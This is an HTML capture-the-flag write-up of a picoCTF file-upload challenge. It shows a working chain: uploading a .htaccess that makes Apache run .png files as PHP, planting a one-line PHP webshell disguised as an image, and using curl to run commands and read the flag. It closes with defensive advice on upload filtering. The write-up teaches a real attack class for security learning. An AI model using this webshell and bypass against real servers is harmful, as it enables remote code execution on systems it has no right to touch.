@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>File Upload Bypass | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>File Upload Bypass</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty medium">Medium</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>File Upload Bypass</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://amiable-citadel.picoctf.net:53117/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-explore-the-upload-form">Step 1: Explore the Upload Form</h3>
+<p>The website is a student ID verification portal that accepts image uploads (JPG, PNG, GIF). The form posts to <code>upload.php</code> and uploaded files are stored in the <code>/images/</code> directory.</p>
+<pre><code class="language-bash">curl -s http://amiable-citadel.picoctf.net:53117/
+</code></pre>
+<hr />
+<h3 id="step-2-test-the-filters">Step 2: Test the Filters</h3>
+<p>First, let's figure out what's blocked and what's allowed:</p>
+<pre><code class="language-bash"># Direct .php upload — BLOCKED
+echo '&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php
+curl -s -X POST http://amiable-citadel.picoctf.net:53117/upload.php \
+  -F &quot;image=@shell.php;type=image/png&quot;
+# Result: Not allowed!
+
+# .phtml — BLOCKED
+# .php.png (double extension) — ALLOWED but not executed as PHP
+# .phar, .php5, .php7, .pht — ALLOWED but not executed as PHP
+# .htaccess — ALLOWED!
+</code></pre>
+<p>The filter blocks <code>.php</code> and <code>.phtml</code> extensions but allows everything else — including <code>.htaccess</code>.</p>
+<hr />
+<h3 id="step-3-upload-a-malicious-htaccess">Step 3: Upload a Malicious .htaccess</h3>
+<p><code>.htaccess</code> is an Apache configuration file that can override server settings on a per-directory basis. We can upload one that tells Apache to treat <code>.png</code> files as PHP:</p>
+<pre><code class="language-bash">printf 'AddType application/x-httpd-php .png' &gt; .htaccess
+curl -s -X POST http://amiable-citadel.picoctf.net:53117/upload.php \
+  -F &quot;image=@.htaccess;type=image/png&quot;
+</code></pre>
+<pre><code>Successfully uploaded!
+Access it at: images/.htaccess
+</code></pre>
+<p>Now any <code>.png</code> file in the <code>/images/</code> directory will be executed as PHP by Apache.</p>
+<hr />
+<h3 id="step-4-upload-a-php-webshell-as-png">Step 4: Upload a PHP Webshell as .png</h3>
+<pre><code class="language-bash">echo '&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php.png
+curl -s -X POST http://amiable-citadel.picoctf.net:53117/upload.php \
+  -F &quot;image=@shell.php.png&quot;
+</code></pre>
+<pre><code>Successfully uploaded!
+Access it at: images/shell.php.png
+</code></pre>
+<p>The file passes the filter because its extension ends with <code>.png</code>. But thanks to our <code>.htaccess</code>, Apache will execute it as PHP.</p>
+<hr />
+<h3 id="step-5-remote-code-execution">Step 5: Remote Code Execution</h3>
+<p>Test command execution:</p>
+<pre><code class="language-bash">curl -s &quot;http://amiable-citadel.picoctf.net:53117/images/shell.php.png?cmd=id&quot;
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Find and read the flag:</p>
+<pre><code class="language-bash">curl -s &quot;http://amiable-citadel.picoctf.net:53117/images/shell.php.png?cmd=find+/+-name+flag*+-type+f+2&gt;/dev/null&quot;
+# /var/www/flag.txt
+
+curl -s &quot;http://amiable-citadel.picoctf.net:53117/images/shell.php.png?cmd=cat+/var/www/flag.txt&quot;
+# picoCTF{s3rv3r_byp4ss_9e7008ba}
+</code></pre>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{s3rv3r_byp4ss_9e7008ba}
+</code></pre>
+<hr />
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+<pre><code>Upload .htaccess (AddType application/x-httpd-php .png)
+        ↓
+Upload shell.php.png (PHP webshell with .png extension)
+        ↓
+Apache reads .htaccess → treats .png as PHP
+        ↓
+shell.php.png executes as PHP → Remote Code Execution
+        ↓
+cat /var/www/flag.txt → Flag
+</code></pre>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Block .htaccess uploads.</strong> If an attacker can upload a <code>.htaccess</code> file, they can override Apache's configuration for that directory — including which file types get executed as code. Always include <code>.htaccess</code> in your upload blocklist, or better yet, use an allowlist approach.</p>
+</li>
+<li>
+<p><strong>Use an allowlist, not a blocklist.</strong> The filter blocked <code>.php</code> and <code>.phtml</code> but missed <code>.htaccess</code> and many other dangerous extensions. A secure upload filter should only allow specific known-safe extensions (e.g., <code>.jpg</code>, <code>.png</code>, <code>.gif</code>) and reject everything else.</p>
+</li>
+<li>
+<p><strong>Don't store uploads in web-accessible directories.</strong> Uploaded files should be stored outside the web root or in a directory where script execution is disabled at the server configuration level (not via <code>.htaccess</code>). This way, even if a malicious file is uploaded, it cannot be executed.</p>
+</li>
+<li>
+<p><strong>Defense in depth for file uploads:</strong></p>
+</li>
+<li>Allowlist file extensions (<code>.jpg</code>, <code>.png</code>, <code>.gif</code> only)</li>
+<li>Validate MIME type AND file content (magic bytes)</li>
+<li>Rename uploaded files to random names</li>
+<li>Store uploads outside the web root</li>
+<li>Disable script execution in upload directories via server config</li>
+<li>Block <code>.htaccess</code>, <code>.user.ini</code>, and other config file uploads</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
